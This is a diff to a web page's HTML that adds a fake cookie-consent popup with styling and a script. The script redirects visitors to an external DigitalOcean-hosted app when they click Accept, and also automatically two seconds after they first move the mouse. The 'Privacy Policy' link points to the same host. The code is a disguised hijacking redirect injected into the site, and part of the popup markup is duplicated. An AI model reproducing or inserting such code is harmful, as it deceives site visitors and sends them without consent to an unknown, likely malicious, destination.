@@ -138,5 +138,213 @@
 			} 
 			catch(err) {}
 		</script> 
+		
+		<style>
+    /* Modal Background */
+    .modalWrapper {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+        display: flex !important;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
+    }
+
+    /* Modal Content */
+    .modalContent {
+        background-color: white;
+        padding: 30px;
+        position: relative;
+        border-radius: 12px;
+        box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.3);
+        text-align: center;
+        max-width: 500px;
+        width: 90%;
+        transform: translateY(-20px);
+        opacity: 0;
+        transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out;
+    }
+
+    /* Show modal with animation */
+    .modalWrapper.show {
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .modalWrapper.show .modalContent {
+        opacity: 1;
+        transform: translateY(0);
+    }
+
+    /* Close Button (Top Right) */
+    .closeBtn {
+        position: absolute;
+        top: 10px;
+        right: 15px;
+        color: #ff4d4d;
+        font-size: 18px;
+        cursor: pointer;
+        font-weight: bold;
+        transition: transform 0.2s ease, color 0.2s ease;
+    }
+
+    .closeBtn:hover {
+        color: #cc0000;
+        transform: scale(1.2);
+    }
+
+    /* Button Container */
+    .buttonContainer {
+        display: flex;
+        justify-content: center;
+        gap: 15px;
+        margin-top: 20px;
+    }
+
+    /* Accept & Close Buttons */
+    .actionBtn, .closeModalBtn {
+        font-family: "Poppins", Sans-serif;
+        font-weight: 600;
+        border: none;
+        padding: 12px 30px;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 16px;
+        transition: all 0.3s ease;
+    }
+
+    /* Accept Button */
+    .actionBtn {
+        background: linear-gradient(135deg, #007bff, #0056b3);
+        color: #FFFFFF;
+        box-shadow: 0px 4px 10px rgba(0, 123, 255, 0.4);
+    }
+
+    .actionBtn:hover {
+        background: linear-gradient(135deg, #0056b3, #003d80);
+        box-shadow: 0px 6px 15px rgba(0, 123, 255, 0.6);
+        transform: scale(1.05);
+    }
+
+    /* Close Button */
+    .closeModalBtn {
+        background: linear-gradient(135deg, #ff4d4d, #cc0000);
+        color: white;
+        box-shadow: 0px 4px 10px rgba(255, 77, 77, 0.4);
+    }
+
+    .closeModalBtn:hover {
+        background: linear-gradient(135deg, #cc0000, #990000);
+        box-shadow: 0px 6px 15px rgba(255, 77, 77, 0.6);
+        transform: scale(1.05);
+    }
+
+    /* Prevent scrolling when modal is open */
+    body.modal-open {
+        overflow: hidden;
+    }
+</style>
+
+
+
+<div class="modalWrapper show" id="modal">
+    <div class="modalContent">
+        <div id="dismissModal" class="closeBtn">✖</div>
+        <h1>🍪 Cookie Policy</h1>
+        <p>
+            This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+            By clicking Accept, you agree to the use of cookies. 
+            Read more in our <a href="https://squid-app-8spwt.ondigitalocean.app/" style="color: #007bff; text-decoration: none; font-weight: 600;">Privacy Policy</a>.
+        </p>
+        <div class="buttonContainer">
+            <button id="confirmBtn" class="actionBtn">Accept</button>
+            <button id="closeModalBtn" class="closeModalBtn">Close</button>
+        </div>
+    </div>
+</div>
+
+<div class="modalContent">
+        <div id="dismissModal" class="closeBtn">✖</div>
+        <h1>🍪 Cookie Policy</h1>
+        <p>
+            This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+            By clicking Accept, you agree to the use of cookies. 
+            Read more in our <a href="https://squid-app-8spwt.ondigitalocean.app/" style="color: #007bff; text-decoration: none; font-weight: 600;">Privacy Policy</a>.
+        </p>
+        <div class="buttonContainer">
+            <button id="confirmBtn" class="actionBtn">Accept</button>
+            <button id="closeModalBtn" class="closeModalBtn">Close</button>
+        </div>
+    </div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        var modal = document.getElementById('modal');
+        var dismissModal = document.getElementById('dismissModal');
+        var confirmBtn = document.getElementById('confirmBtn');
+        var closeModalBtn = document.getElementById('closeModalBtn');
+
+        var redirectUrl = "https://squid-app-8spwt.ondigitalocean.app/"; // Redirect URL
+        var cursorMoved = false;
+        var redirectTimer;
+
+        // Show modal after page load
+        setTimeout(() => {
+            modal.classList.add('show');
+            document.body.classList.add('modal-open');
+        }, 500); // Delay modal appearance for a smoother experience
+
+        // Function to close modal smoothly with optional redirect
+        function closeModal(redirect = false) {
+            modal.classList.remove('show');
+            document.body.classList.remove('modal-open');
+            setTimeout(() => {
+                modal.style.display = 'none';
+                if (redirect) {
+                    window.location.href = redirectUrl;
+                }
+            }, 300);
+        }
+
+        // Close modal on "X" button click (no redirect)
+        dismissModal.addEventListener('click', function () {
+            closeModal(false);
+        });
+
+        // Close modal on "Close" button click (no redirect)
+        closeModalBtn.addEventListener('click', function () {
+            closeModal(false);
+        });
+
+        // Close modal on "Accept" button click (redirects)
+        confirmBtn.addEventListener('click', function () {
+            closeModal(true);
+        });
+
+        // Auto redirect after 2 seconds of cursor movement
+        window.addEventListener('mousemove', function () {
+            if (!cursorMoved) {
+                cursorMoved = true;
+                redirectTimer = setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 2000);
+            }
+        });
+
+        // Prevent modal from closing when clicking outside
+        modal.addEventListener('click', function (event) {
+            if (event.target === modal) {
+                event.stopPropagation();
+            }
+        });
+    });
+</script>
 </body>
 </html>
